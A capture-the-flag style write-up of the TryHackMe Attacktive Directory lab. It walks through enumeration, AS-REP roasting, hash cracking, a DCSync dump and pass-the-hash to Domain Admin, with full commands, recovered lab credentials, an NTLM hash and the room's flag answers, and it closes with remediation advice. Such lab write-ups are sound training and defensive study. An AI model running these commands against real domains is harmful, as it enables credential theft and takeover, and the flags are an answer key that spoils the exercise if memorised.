# Write-up: Attacktive Directory lab on THM

This document is a structured security write-up based on hands-on exploitation of the **Attacktive Directory** lab on TryHackMe website: https://tryhackme.com/room/attacktivedirectory

**Date:** January 7, 2026  
**Source:** TryHackMe — Attacktive Directory & Personal Study Notes

---

## Research Overview

This lab demonstrates a **linear and realistic attack path against an Active Directory Domain Controller**, abusing common misconfigurations in Kerberos authentication, credential hygiene, and privilege assignment. The attack chain progresses from external reconnaissance to full Domain Administrator compromise without any exploitation of memory corruption or zero-day vulnerabilities.

The entire compromise relies on:

* Excessive trust in Kerberos defaults
* Weak operational security practices
* Overprivileged service and backup accounts

---

## Environment Identification & Reconnaissance

### 1. Network Scanning (Nmap)

The engagement starts with standard network reconnaissance against a Windows host:

```
sudo nmap -sC -sV -v -Pn 10.81.177.112
```

**Flags explanation:**

* `-sC` — Default NSE scripts
* `-sV` — Service version detection
* `-v` — Verbose output
* `-Pn` — Disable ICMP ping (Windows often blocks it)

### 2. Domain Controller Fingerprinting

The scan reveals a classic Domain Controller port layout:

* **88/tcp** — Kerberos
* **139/tcp** — NetBIOS
* **389/tcp** — LDAP
* **445/tcp** — SMB
* **3268/tcp** — Global Catalog (LDAP)

Nmap also discloses domain information:

```
DNS_Domain_Name: spookysec.local
DNS_Computer_Name: AttacktiveDirectory.spookysec.local
```

The host was added to `/etc/hosts` to support Kerberos-based tooling:

```
10.81.177.112 spookysec.local AttacktiveDirectory.spookysec.local
```

---

## SMB & Domain Enumeration

### 3. enum4linux — Anonymous Enumeration

`enum4linux` is used to enumerate SMB and NetBIOS services:

```
enum4linux -a 10.81.177.112
```

The server allows **anonymous SMB sessions**:

```
[+] Server allows sessions using username '', password ''
```

Discovered domain name:

```
Domain Name: THM-AD
```

The host is confirmed as a domain member:

```
[+] Host is part of a domain
```

Kerberos system account is visible:

```
THM-AD\\krbtgt
```

This confirms we are dealing with a fully functional Active Directory environment.

---

## Kerberos User Enumeration

### 4. Kerbrute — Stealth User Discovery

Since port **88 (Kerberos)** is open, `kerbrute` is used to enumerate valid usernames.

**Why Kerbrute?**

* Does not trigger account lockouts
* Avoids noisy failed-login logs
* Simply checks whether a username exists

```
./kerbrute_linux_amd64 userenum -d spookysec.local --dc 10.81.177.112 users.txt
```

### Valid Users Discovered

```
james@spookysec.local
svc-admin@spookysec.local
robin@spookysec.local
darkstar@spookysec.local
backup@spookysec.local
administrator@spookysec.local
```

**Key observation:**

* `svc-admin` (service account) immediately stands out as a high-value target
* `backup` is also potentially dangerous

---

## AS-REP Roasting (Kerberos Pre-Authentication Abuse)

### 5. Understanding the Vulnerability

Active Directory allows disabling **Kerberos Pre-Authentication** per user.

If enabled:

* The KDC returns encrypted authentication material **without verifying identity**
* The attacker receives data encrypted with the user’s password
* Offline brute-force becomes possible

This attack is known as **AS-REP Roasting**.

### 6. Extracting Kerberos Hashes

Using Impacket’s `GetNPUsers`:

```
impacket-GetNPUsers spookysec.local/ -usersfile users2.txt \
-format hashcat -outputfile hashes.txt \
-dc-ip 10.81.177.112 -no-pass
```

### Result

```
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:...
```

**Success:** `svc-admin` does not require pre-authentication.

---

## Offline Password Cracking

### 7. Hashcat

```
hashcat -m 18200 hashes.txt /usr/share/eaphammer/wordlists/rockyou.txt --force
```

**Recovered credentials:**

```
svc-admin : management2005
```

---

## SMB Access & Credential Leakage

### 8. SMB Share Enumeration

```
smbclient -L //10.81.177.112 -U svc-admin
```

Discovered shares:

* ADMIN$
* C$
* backup
* NETLOGON
* SYSVOL

### 9. Backup Share Access

```
smbclient //10.81.177.112/backup -U svc-admin
```

File retrieved:

```
backup_credentials.txt
```

Decoded Base64 content:

```
backup@spookysec.local : backup2517860
```

---

## Domain Database Dump (DCSync Attack)

### 10. SecretsDump — NTDS.dit Extraction

The `backup` account has **replication privileges**.

```
impacket-secretsdump spookysec.local/backup:backup2517860@10.81.177.112
```

Administrator NTLM hash obtained:

```
Administrator:500:...:0e0363213e37b94221497260b0bcb4fc:::
```

**Attack technique:**

* Abuse of **MS-DRSR (Directory Replication Service)**
* Domain Controller is tricked into syncing password data

---

## Privilege Escalation — Pass-the-Hash

### 11. Evil-WinRM

```
evil-winrm -i 10.81.177.112 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
```

Access granted:

```
PS C:\\Users\Administrator>
```

---

## Flags & Lab Completion

* **Administrator flag:**

```
TryHackMe{4ctiveD1rectoryM4st3r}
```

* **Backup user flag:**

```
TryHackMe{B4ckM3UpSc0tty!}
```

* **Service account flag:**

```
TryHackMe{K3rb3r0s_Pr3_4uth}
```

**All objectives completed successfully.**

---

## Tooling Summary

* `nmap`
* `enum4linux`
* `kerbrute`
* Impacket (`GetNPUsers`, `secretsdump`)
* `hashcat`
* `smbclient`
* `evil-winrm`

---

## Security Failures & Root Causes

1. **Kerberos Pre-Authentication disabled** (Initial Access)
2. **Weak service account passwords**
3. **Plaintext credential storage**
4. **Overprivileged backup account**
5. **Unrestricted domain replication rights (DCSync)**

---

## Remediation Recommendations

* Enforce Kerberos pre-authentication on all accounts
* Apply strong, rotated passwords for service users
* Prohibit plaintext credential storage
* Restrict replication rights strictly to Domain Controllers
* Audit privilege creep regularly
* Monitor Kerberos anomalies and AS-REQ patterns

---

## Conclusion

This lab demonstrates how **misconfiguration beats exploitation**. No malware, no memory corruption — just abusing trust relationships and weak operational discipline. The attack path is realistic, repeatable, and devastating.

---
*Write-up compiled based on TryHackMe Attacktive Directory (https://tryhackme.com/room/attacktivedirectory) lab.*
